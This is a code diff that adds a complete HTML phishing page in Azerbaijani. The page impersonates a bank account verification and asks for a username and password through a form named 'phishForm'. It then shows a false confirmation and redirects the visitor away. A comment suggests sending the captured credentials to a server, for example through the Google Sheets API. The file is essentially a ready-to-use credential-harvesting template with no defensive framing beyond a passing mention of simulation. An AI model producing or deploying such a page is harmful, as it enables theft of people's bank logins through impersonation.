@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <title>Bank Hesabınız Təsdiqlənməlidir</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        h2 { text-align: center; color: #333; }
+        p { text-align: center; color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Təsdiq Et</h2>
+    <p>Hesabınızı təhlükəsizləşdirmək üçün daxil olun.</p>
+    <form id="phishForm">
+        <input type="text" placeholder="İstifadəçi adı" required>
+        <input type="password" placeholder="Şifrə" required>
+        <button type="submit">Daxil Ol</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('phishForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        // Burada veriləni serverə göndərə bilərsən (Google Sheets API və s.)
+        alert("Təşəkkür edirik! Məlumatlarınız qəbul edildi.");
+        // Simulyasiya üçün 2 saniyə sonra real bank saytına yönləndir
+        setTimeout(() => {
+            window.location.href = "https://www.google.com"; 
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
